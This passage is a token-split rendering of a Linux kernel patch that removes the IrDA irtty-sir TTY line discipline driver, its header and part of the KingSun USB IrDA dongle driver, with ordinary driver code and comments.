";", ");", "if", "(", "unlikely", "(", "count", "=", "=", "0", ")", ")", "/", "*", "yes", ",", "this", "happens", "*", "/", "return", ";", "dev", "=", "priv", "-", ">", "dev", ";", "if", "(", "!", "dev", ")", "{", "net_warn_ratelimited", "(", "\"%", "s", "(", "),", "not", "ready", "yet", "!", "\\", "n", "\"", ",", "__func__", ")", ";", "return", ";", "}", "for", "(", "i", "=", "0", ";", "i", "<", "count", ";", "i", "+", "+)", "{", "/", "*", "*", "Characters", "received", "with", "a", "parity", "error", ",", "etc", "?", "*", "/", "if", "(", "fp", "&", "&", "*", "fp", "+", "+)", "{", "pr_debug", "(", "\"", "Framing", "or", "parity", "error", "!", "\\", "n", "\"", ");", "sirdev_receive", "(", "dev", ",", "NULL", ",", "0", ")", ";", "/", "*", "notify", "sir_dev", "(", "updating", "stats", ")", "*", "/", "return", ";", "}", "}", "sirdev_receive", "(", "dev", ",", "cp", ",", "count", ")", ";", "}", "/", "*", "*", "Function", "irtty_write_wakeup", "(", "tty", ")", "*", "*", "Called", "by", "the", "driver", "when", "there", "'", "s", "room", "for", "more", "data", ".", "If", "we", "have", "*", "more", "packets", "to", "send", ",", "we", "send", "them", "here", ".", "*", "*", "/", "static", "void", "irtty_write_wakeup", "(", "struct", "tty_struct", "*", "tty", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "tty", "-", ">", "disc_data", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", ";", ");", "clear_bit", "(", "TTY_DO_WRITE_WAKEUP", ",", "&", "tty", "-", ">", "flags", ")", ";", "if", "(", "priv", "-", ">", "dev", ")", "sirdev_write_complete", "(", "priv", "-", ">", "dev", ")", ";", "}", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "/", "*", "*", "Function", "irtty_stop_receiver", "(", "tty", ",", "stop", ")", "*", "*", "/", "static", "inline", "void", "irtty_stop_receiver", "(", "struct", "tty_struct", "*", "tty", ",", "int", "stop", ")", "{", "struct", "ktermios", "old_termios", ";", "int", "cflag", ";", "down_write", "(", "&", "tty", "-", ">", "termios_rwsem", ")", ";", "old_termios", "=", "tty", "-", ">", "termios", ";", "cflag", "=", "tty", "-", ">", "termios", ".", "c_cflag", ";", "if", "(", "stop", ")", "cflag", "&", "=", "~", "CREAD", ";", "else", "cflag", "|", "=", "CREAD", ";", "tty", "-", ">", "termios", ".", "c_cflag", "=", "cflag", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "set_termios", ")", "tty", "-", ">", "ops", "-", ">", "set_termios", "(", "tty", ",", "&", "old_termios", ")", ";", "up_write", "(", "&", "tty", "-", ">", "termios_rwsem", ")", ";", "}", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "/", "*", "serialize", "ldisc", "open", "/", "close", "with", "sir_dev", "*", "/", "static", "DEFINE_MUTEX", "(", "irtty_mutex", ")", ";", "/", "*", "notifier", "from", "sir_dev", "when", "irda", "%", "device", "gets", "opened", "(", "ifup", ")", "*", "/", "static", "int", "irtty_start_dev", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "sirtty_cb", "*", "priv", ";", "struct", "tty_struct", "*", "tty", ";", "/", "*", "serialize", "with", "ldisc", "open", "/", "close", "*", "/", "mutex_lock", "(", "&", "irtty_mutex", ")", ";", "priv", "=", "dev", "-", ">", "priv", ";", "if", "(", "unlikely", "(", "!", "priv", "|", "|", "priv", "-", ">", "magic", "!", "=", "IRTTY_MAGIC", ")", ")", "{", "mutex_unlock", "(", "&", "irtty_mutex", ")", ";", "return", "-", "ESTALE", ";", "}", "tty", "=", "priv", "-", ">", "tty", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "start", ")", "tty", "-", ">", "ops", "-", ">", "start", "(", "tty", ")", ";", "/", "*", "Make", "sure", "we", "can", "receive", "more", "data", "*", "/", "irtty_stop_receiver", "(", "tty", ",", "FALSE", ")", ";", "mutex_unlock", "(", "&", "irtty_mutex", ")", ";", "return", "0", ";", "}", "/", "*", "notifier", "from", "sir_dev", "when", "irda", "%", "device", "gets", "closed", "(", "ifdown", ")", "*", "/", "static", "int", "irtty_stop_dev", "(", "struct", "sir_dev", "*", "dev", ")", "{", "struct", "sirtty_cb", "*", "priv", ";", "struct", "tty_struct", "*", "tty", ";", "/", "*", "serialize", "with", "ldisc", "open", "/", "close", "*", "/", "mutex_lock", "(", "&", "irtty_mutex", ")", ";", "priv", "=", "dev", "-", ">", "priv", ";", "if", "(", "unlikely", "(", "!", "priv", "|", "|", "priv", "-", ">", "magic", "!", "=", "IRTTY_MAGIC", ")", ")", "{", "mutex_unlock", "(", "&", "irtty_mutex", ")", ";", "return", "-", "ESTALE", ";", "}", "tty", "=", "priv", "-", ">", "tty", ";", "/", "*", "Make", "sure", "we", "don", "'", "t", "receive", "more", "data", "*", "/", "irtty_stop_receiver", "(", "tty", ",", "TRUE", ")", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "stop", ")", "tty", "-", ">", "ops", "-", ">", "stop", "(", "tty", ")", ";", "mutex_unlock", "(", "&", "irtty_mutex", ")", ";", "return", "0", ";", "}", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "static", "struct", "sir_driver", "sir_tty_drv", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "driver_name", "=", "\"", "sir_tty", "\"", ",", ".", "start_dev", "=", "irtty_start_dev", ",", ".", "stop_dev", "=", "irtty_stop_dev", ",", ".", "do_write", "=", "irtty_do_write", ",", ".", "chars_in_buffer", "=", "irtty_chars_in_buffer", ",", ".", "wait_until_sent", "=", "irtty_wait_until_sent", ",", ".", "set_speed", "=", "irtty_change_speed", ",", ".", "set_dtr_rts", "=", "irtty_set_dtr_rts", ",", "}", ";", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "/", "*", "*", "Function", "irtty_ioctl", "(", "tty", ",", "file", ",", "cmd", ",", "arg", ")", "*", "*", "The", "Swiss", "army", "knife", "of", "system", "calls", ":", "-)", "*", "*", "/", "static", "int", "irtty_ioctl", "(", "struct", "tty_struct", "*", "tty", ",", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "unsigned", "long", "arg", ")", "{", "struct", "irtty_info", "{", "char", "name", "[", "6", "]", ";", "}", "info", ";", "struct", "sir_dev", "*", "dev", ";", "struct", "sirtty_cb", "*", "priv", "=", "tty", "-", ">", "disc_data", ";", "int", "err", "=", "0", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", "-", "ENODEV", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", "-", "EBADR", ";", ");", "pr_debug", "(", "\"%", "s", "(", "cmd", "=", "0x", "%", "X", ")", "\\", "n", "\"", ",", "__func__", ",", "cmd", ")", ";", "dev", "=", "priv", "-", ">", "dev", ";", "IRDA_ASSERT", "(", "dev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "switch", "(", "cmd", ")", "{", "case", "IRTTY_IOCTDONGLE", ":", "/", "*", "this", "call", "blocks", "for", "completion", "*", "/", "err", "=", "sirdev_set_dongle", "(", "dev", ",", "(", "IRDA_DONGLE", ")", "arg", ")", ";", "break", ";", "case", "IRTTY_IOCGET", ":", "IRDA_ASSERT", "(", "dev", "-", ">", "netdev", "!", "=", "NULL", ",", "return", "-", "1", ";", ");", "memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "info", ")", ");", "strncpy", "(", "info", ".", "name", ",", "dev", "-", ">", "netdev", "-", ">", "name", ",", "sizeof", "(", "info", ".", "name", ")", "-", "1", ")", ";", "if", "(", "copy_to_user", "(", "(", "void", "__user", "*", ")", "arg", ",", "&", "info", ",", "sizeof", "(", "info", ")", "))", "err", "=", "-", "EFAULT", ";", "break", ";", "default", ":", "err", "=", "tty_mode_ioctl", "(", "tty", ",", "file", ",", "cmd", ",", "arg", ")", ";", "break", ";", "}", "return", "err", ";", "}", "/", "*", "*", "Function", "irtty_open", "(", "tty", ")", "*", "*", "This", "function", "is", "called", "by", "the", "TTY", "module", "when", "the", "IrDA", "line", "*", "discipline", "is", "called", "for", ".", "Because", "we", "are", "sure", "the", "tty", "line", "exists", ",", "*", "we", "only", "have", "to", "link", "it", "to", "a", "free", "IrDA", "channel", ".", "*", "/", "static", "int", "irtty_open", "(", "struct", "tty_struct", "*", "tty", ")", "{", "struct", "sir_dev", "*", "dev", ";", "struct", "sirtty_cb", "*", "priv", ";", "int", "ret", "=", "0", ";", "/", "*", "Module", "stuff", "handled", "via", "irda_ldisc", ".", "owner", "-", "Jean", "II", "*", "/", "/", "*", "stop", "the", "underlying", "driver", "*", "/", "irtty_stop_receiver", "(", "tty", ",", "TRUE", ")", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "stop", ")", "tty", "-", ">", "ops", "-", ">", "stop", "(", "tty", ")", ";", "tty_driver_flush_buffer", "(", "tty", ")", ";", "/", "*", "apply", "mtt", "override", "*", "/", "sir_tty_drv", ".", "qos_mtt_bits", "=", "qos_mtt_bits", ";", "/", "*", "get", "a", "sir", "device", "instance", "for", "this", "driver", "*", "/", "dev", "=", "sirdev_get_instance", "(", "&", "sir_tty_drv", ",", "tty", "-", ">", "name", ")", ";", "if", "(", "!", "dev", ")", "{", "ret", "=", "-", "ENODEV", ";", "goto", "out", ";", "}", "/", "*", "allocate", "private", "device", "info", "block", "*", "/", "priv", "=", "kzalloc", "(", "sizeof", "(", "*", "priv", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "priv", ")", "{", "ret", "=", "-", "ENOMEM", ";", "goto", "out_put", ";", "}", "priv", "-", ">", "magic", "=", "IRTTY_MAGIC", ";", "priv", "-", ">", "tty", "=", "tty", ";", "priv", "-", ">", "dev", "=", "dev", ";", "/", "*", "serialize", "with", "start_dev", "-", "in", "case", "we", "were", "racing", "with", "ifup", "*", "/", "mutex_lock", "(", "&", "irtty_mutex", ")", ";", "dev", "-", ">", "priv", "=", "priv", ";", "tty", "-", ">", "disc_data", "=", "priv", ";", "tty", "-", ">", "receive_room", "=", "65536", ";", "mutex_unlock", "(", "&", "irtty_mutex", ")", ";", "pr_debug", "(", "\"%", "s", "-", "%", "s", ":", "irda", "line", "discipline", "opened", "\\", "n", "\"", ",", "__func__", ",", "tty", "-", ">", "name", ")", ";", "return", "0", ";", "out_put", ":", "sirdev_put_instance", "(", "dev", ")", ";", "out", ":", "return", "ret", ";", "}", "/", "*", "*", "Function", "irtty_close", "(", "tty", ")", "*", "*", "Close", "down", "a", "IrDA", "channel", ".", "This", "means", "flushing", "out", "any", "pending", "queues", ",", "*", "and", "then", "restoring", "the", "TTY", "line", "discipline", "to", "what", "it", "was", "before", "it", "got", "*", "hooked", "to", "IrDA", "(", "which", "usually", "is", "TTY", "again", ")", ".", "*", "/", "static", "void", "irtty_close", "(", "struct", "tty_struct", "*", "tty", ")", "{", "struct", "sirtty_cb", "*", "priv", "=", "tty", "-", ">", "disc_data", ";", "IRDA_ASSERT", "(", "priv", "!", "=", "NULL", ",", "return", ";", ");", "IRDA_ASSERT", "(", "priv", "-", ">", "magic", "=", "=", "IRTTY_MAGIC", ",", "return", ";", ");", "/", "*", "Hm", ",", "with", "a", "dongle", "attached", "the", "dongle", "driver", "wants", "*", "to", "close", "the", "dongle", "-", "which", "requires", "the", "use", "of", "*", "some", "tty", "write", "and", "/", "or", "termios", "or", "ioctl", "operations", ".", "*", "Are", "we", "allowed", "to", "call", "those", "when", "already", "requested", "*", "to", "shutdown", "the", "ldisc", "?", "*", "If", "not", ",", "we", "should", "somehow", "mark", "the", "dev", "being", "staled", ".", "*", "Question", "remains", ",", "how", "to", "close", "the", "dongle", "in", "this", "case", ".", "..", "*", "For", "now", "let", "'", "s", "assume", "we", "are", "granted", "to", "issue", "tty", "driver", "calls", "*", "until", "we", "return", "here", "from", "the", "ldisc", "close", ".", "I", "'", "m", "just", "wondering", "*", "how", "this", "behaves", "with", "hotpluggable", "serial", "hardware", "like", "*", "rs232", "-", "pcmcia", "card", "or", "usb", "-", "serial", ".", "..", "*", "*", "priv", "-", ">", "tty", "=", "NULL", "?", ";", "*", "/", "/", "*", "we", "are", "dead", "now", "*", "/", "tty", "-", ">", "disc_data", "=", "NULL", ";", "sirdev_put_instance", "(", "priv", "-", ">", "dev", ")", ";", "/", "*", "Stop", "tty", "*", "/", "clear_bit", "(", "TTY_DO_WRITE_WAKEUP", ",", "&", "tty", "-", ">", "flags", ")", ";", "if", "(", "tty", "-", ">", "ops", "-", ">", "stop", ")", "tty", "-", ">", "ops", "-", ">", "stop", "(", "tty", ")", ";", "kfree", "(", "priv", ")", ";", "pr_debug", "(", "\"%", "s", "-", "%", "s", ":", "irda", "line", "discipline", "closed", "\\", "n", "\"", ",", "__func__", ",", "tty", "-", ">", "name", ")", ";", "}", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "static", "struct", "tty_ldisc_ops", "irda_ldisc", "=", "{", ".", "magic", "=", "TTY_LDISC_MAGIC", ",", ".", "name", "=", "\"", "irda", "\"", ",", ".", "flags", "=", "0", ",", ".", "open", "=", "irtty_open", ",", ".", "close", "=", "irtty_close", ",", ".", "read", "=", "NULL", ",", ".", "write", "=", "NULL", ",", ".", "ioctl", "=", "irtty_ioctl", ",", ".", "poll", "=", "NULL", ",", ".", "receive_buf", "=", "irtty_receive_buf", ",", ".", "write_wakeup", "=", "irtty_write_wakeup", ",", ".", "owner", "=", "THIS_MODULE", ",", "}", ";", "/", "*", "-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "*", "/", "static", "int", "__init", "irtty_sir_init", "(", "void", ")", "{", "int", "err", ";", "if", "(", "(", "err", "=", "tty_register_ldisc", "(", "N_IRDA", ",", "&", "irda_ldisc", ")", ")", "!", "=", "0", ")", "net_err_ratelimited", "(", "\"", "IrDA", ":", "can", "'", "t", "register", "line", "discipline", "(", "err", "=", "%", "d", ")", "\\", "n", "\"", ",", "err", ")", ";", "return", "err", ";", "}", "static", "void", "__exit", "irtty_sir_cleanup", "(", "void", ")", "{", "int", "err", ";", "if", "(", "(", "err", "=", "tty_unregister_ldisc", "(", "N_IRDA", ")", "))", "{", "net_err_ratelimited", "(", "\"%", "s", "(", "),", "can", "'", "t", "unregister", "line", "discipline", "(", "err", "=", "%", "d", ")", "\\", "n", "\"", ",", "__func__", ",", "err", ")", ";", "}", "}", "module_init", "(", "irtty_sir_init", ")", ";", "module_exit", "(", "irtty_sir_cleanup", ")", ";", "MODULE_AUTHOR", "(", "\"", "Dag", "Brattli", "<", "dagb", "@", "cs", ".", "uit", ".", "no", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "TTY", "device", "driver", "\"", ");", "MODULE_ALIAS_LDISC", "(", "N_IRDA", ")", ";", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "34", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "sir_tty", ".", "h", ":", "definitions", "for", "the", "irtty_sir", "client", "driver", "(", "former", "irtty", ")", "*", "*", "Copyright", "(", "c", ")", "2002", "Martin", "Diehl", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "*", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "*", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "*", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*/", "#", "ifndef", "IRTTYSIR_H", "#", "define", "IRTTYSIR_H", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda_device", ".", "h", ">", "/", "/", "chipio_t", "#", "define", "IRTTY_IOC_MAGIC", "'", "e", "'", "#", "define", "IRTTY_IOCTDONGLE", "_IO", "(", "IRTTY_IOC_MAGIC", ",", "1", ")", "#", "define", "IRTTY_IOCGET", "_IOR", "(", "IRTTY_IOC_MAGIC", ",", "2", ",", "struct", "irtty_info", ")", "#", "define", "IRTTY_IOC_MAXNR", "2", "struct", "sirtty_cb", "{", "magic_t", "magic", ";", "struct", "sir_dev", "*", "dev", ";", "struct", "tty_struct", "*", "tty", ";", "chipio_t", "io", ";", "/", "*", "IrDA", "controller", "information", "*", "/", "}", ";", "#", "endif", "@", "@", "-", "1", ",", "634", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "kingsun", "-", "sir", ".", "c", "*", "Version", ":", "0", ".", "1", ".", "1", "*", "Description", ":", "Irda", "KingSun", "/", "DonShine", "USB", "Dongle", "*", "Status", ":", "Experimental", "*", "Author", ":", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "*", "*", "Based", "on", "stir4200", "and", "mcs7780", "drivers", ",", "with", "(", "strange", "?", ")", "differences", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "This", "is", "my", "current", "(", "2007", "-", "04", "-", "25", ")", "understanding", "of", "how", "this", "dongle", "is", "supposed", "*", "to", "work", ".", "This", "is", "based", "on", "reverse", "-", "engineering", "and", "examination", "of", "the", "packet", "*", "data", "sent", "and", "received", "by", "the", "WinXP", "driver", "using", "USBSnoopy", ".", "Feel", "free", "to", "*", "update", "here", "as", "more", "of", "this", "dongle", "is", "known", ":", "*", "*", "General", ":", "Unlike", "the", "other", "USB", "IrDA", "dongles", ",", "this", "particular", "dongle", "exposes", ",", "*", "not", "two", "bulk", "(", "in", "and", "out", ")", "endpoints", ",", "but", "two", "*", "interrupt", "*", "ones", ".", "This", "dongle", ",", "*", "like", "the", "bulk", "based", "ones", "(", "stir4200", ".", "c", "and", "mcs7780", ".", "c", ")", ",", "requires", "polling", "in", "*", "order", "to", "receive", "data", ".", "*", "Transmission", ":", "Just", "like", "stir4200", ",", "this", "dongle", "uses", "a", "raw", "stream", "of", "data", ",", "*", "which", "needs", "to", "be", "wrapped", "and", "escaped", "in", "a", "similar", "way", "as", "in", "stir4200", ".", "c", ".", "*", "Reception", ":", "Poll", "-", "based", ",", "as", "in", "stir4200", ".", "Each", "read", "returns", "the", "contents", "of", "a", "*", "8", "-", "byte", "buffer", ",", "of", "which", "the", "first", "byte", "(", "LSB", ")", "indicates", "the", "number", "of", "bytes", "*", "(", "1", "-", "7", ")", "of", "valid", "data", "contained", "within", "the", "remaining", "7", "bytes", ".", "For", "example", ",", "if", "*", "the", "buffer", "had", "the", "following", "contents", ":", "*", "06", "ff", "ff", "ff", "c0", "01", "04", "aa", "*", "This", "means", "that", "(", "06", ")", "there", "are", "6", "bytes", "of", "valid", "data", ".", "The", "byte", "0xaa", "at", "the", "*", "end", "is", "garbage", "(", "left", "over", "from", "a", "previous", "reception", ")", "and", "is", "discarded", ".", "*", "If", "a", "read", "returns", "an", "\"", "impossible", "\"", "value", "as", "the", "length", "of", "valid", "data", "(", "such", "as", "*", "0x36", ")", "in", "the", "first", "byte", ",", "then", "the", "buffer", "is", "uninitialized", "(", "as", "is", "the", "case", "of", "*", "first", "plug", "-", "in", ")", "and", "its", "contents", "should", "be", "discarded", ".", "There", "is", "currently", "no", "*", "evidence", "that", "the", "top", "5", "bits", "of", "the", "1st", "byte", "of", "the", "buffer", "can", "have", "values", "*", "other", "than", "0", "once", "reception", "begins", ".", "*", "Once", "valid", "bytes", "are", "collected", ",", "the", "assembled", "stream", "is", "a", "sequence", "of", "*", "wrapped", "IrDA", "frames", "that", "is", "unwrapped", "and", "unescaped", "as", "in", "stir4200", ".", "c", ".", "*", "BIG", "FAT", "WARNING", ":", "the", "dongle", "does", "*", "not", "*", "reset", "the", "RX", "buffer", "in", "any", "way", "after", "*", "a", "successful", "read", "from", "the", "host", ",", "which", "means", "that", "in", "absence", "of", "further", "*", "reception", ",", "repeated", "reads", "from", "the", "dongle", "will", "return", "the", "exact", "same", "*", "contents", "repeatedly", ".", "Attempts", "to", "be", "smart", "and", "cache", "a", "previous", "read", "seem", "*", "to", "result", "in", "corrupted", "packets", ",", "so", "this", "driver", "depends", "on", "the", "unwrap", "logic", "*", "to", "sort", "out", "any", "repeated", "reads", ".", "*", "Speed", "change", ":", "no", "commands", "observed", "so", "far", "to", "change", "speed", ",", "assumed", "fixed", "*", "9600bps", "(", "SIR", ")", ".", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "errno", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "usb", ".", "h", ">", "#", "include", "<", "linux", "/", "device", ".", "h", ">", "#", "include", "<", "linux", "/", "crc32", ".", "h", ">", "#", "include", "<", "asm", "/", "unaligned", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "crc", ".", "h", ">", "/", "*", "*", "According", "to", "lsusb", ",", "0x07c0", "is", "assigned", "to", "*", "\"", "Code", "Mercenaries", "Hard", "-", "und", "Software", "GmbH", "\"", "*", "/", "#", "define", "KING_VENDOR_ID", "0x07c0", "#", "define", "KING_PRODUCT_ID", "0x4200", "/", "*", "These", "are", "the", "currently", "known", "USB", "ids", "*", "/", "static", "const", "struct", "usb_device_id", "dongles", "[", "]", "=", "{", "/", "*", "KingSun", "Co", ",", "Ltd", "IrDA", "/", "USB", "Bridge", "*", "/", "{", "USB_DEVICE", "(", "KING_VENDOR_ID", ",", "KING_PRODUCT_ID", ")", "}", ",", "{", "}", "}", ";", "MODULE_DEVICE_TABLE", "(", "usb", ",", "dongles", ")", ";", "#", "define", "KINGSUN_MTT", "0x07", "#", "define", "KINGSUN_FIFO_SIZE", "4096", "#", "define", "KINGSUN_EP_IN", "0", "#", "define", "KINGSUN_EP_OUT", "1", "struct", "kingsun_cb", "{", "struct", "usb_device", "*", "usbdev", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "network", "layer", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "__u8", "*", "in_buf", ";", "/", "*", "receive", "buffer", "*", "/", "__u8", "*", "out_buf", ";", "/", "*", "transmit", "buffer", "*", "/", "__u8", "max_rx", ";", "/", "*", "max", ".", "atomic", "read", "from", "dongle", "(", "usually", "8", ")", ",", "also", "size", "of", "in_buf", "*", "/", "__u8", "max_tx", ";", "/", "*", "max", ".", "atomic", "write", "to", "dongle", "(", "usually", "8", ")", "*", "/", "iobuff_t", "rx_buff", ";", "/", "*", "receive", "unwrap", "state", "machine", "*", "/", "spinlock_t", "lock", ";", "int", "receiving", ";", "__u8", "ep_in", ";", "__u8", "ep_out", ";", "struct", "urb", "*", "tx_urb", ";", "struct", "urb", "*", "rx_urb", ";", "}", ";", "/", "*", "Callback", "transmission", "routine", "*", "/", "static", "void", "kingsun_send_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "struct", "net_device", "*", "netdev", "=", "kingsun", "-", ">", "netdev", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "kingsun_send_irq", ":", "Network", "not", "running", "!", "\\", "n", "\"", ");", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "kingsun_send_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "}", "netif_wake_queue", "(", "netdev", ")", ";", "}", "/", "*", "*", "Called", "from", "net", "/", "core", "when", "new", "frame", "is", "available", ".", "*", "/", "static", "netdev_tx_t", "kingsun_hard_xmit", "(", "struct", "sk_buff", "*", "skb", ",", "struct", "net_device", "*", "netdev", ")", "{", "struct", "kingsun_cb", "*", "kingsun", ";", "int", "wraplen", ";", "int", "ret", "=", "0", ";", "netif_stop_queue", "(", "netdev", ")", ";", "/", "*", "the", "IRDA", "wrapping", "routines", "don", "'", "t", "deal", "with", "non", "linear", "skb", "*", "/", "SKB_LINEAR_ASSERT", "(", "skb", ")", ";", "kingsun", "=", "netdev_priv", "(", "netdev", ")", ";", "spin_lock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "/", "*", "Append", "data", "to", "the", "end", "of", "whatever", "data", "remains", "to", "be", "transmitted", "*", "/", "wraplen", "=", "async_wrap_skb", "(", "skb", ",", "kingsun", "-", ">", "out_buf", ",", "KINGSUN_FIFO_SIZE", ")", ";", "/", "*", "Calculate", "how", "much", "data", "can", "be", "transmitted", "in", "this", "urb", "*", "/", "usb_fill_int_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_sndintpipe", "(", "kingsun", "-", ">", "usbdev", ",", "kingsun", "-", ">", "ep_out", ")", ",", "kingsun", "-", ">", "out_buf", ",", "wraplen", ",", "kingsun_send_irq", ",", "kingsun", ",", "1", ")", ";", "if", "(", "(", "ret", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "GFP_ATOMIC", ")", "))", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "kingsun_hard_xmit", ":", "failed", "tx_urb", "submit", ":", "%", "d", "\\", "n", "\"", ",", "ret", ")", ";", "switch", "(", "ret", ")", "{", "case", "-", "ENODEV", ":", "case", "-", "EPIPE", ":", "break", ";", "default", ":", "netdev", "-", ">", "stats", ".", "tx_errors", "+", "+;", "netif_start_queue", "(", "netdev", ")", ";", "}", "}", "else", "{", "netdev", "-", ">", "stats", ".", "tx_packets", "+", "+;", "netdev", "-", ">", "stats", ".", "tx_bytes", "+", "=", "skb", "-", ">", "len", ";", "}", "dev_kfree_skb", "(", "skb", ")", ";", "spin_unlock", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "return", "NETDEV_TX_OK", ";", "}", "/", "*", "Receive", "callback", "function", "*", "/", "static", "void", "kingsun_rcv_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "kingsun_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "int", "ret", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "kingsun", 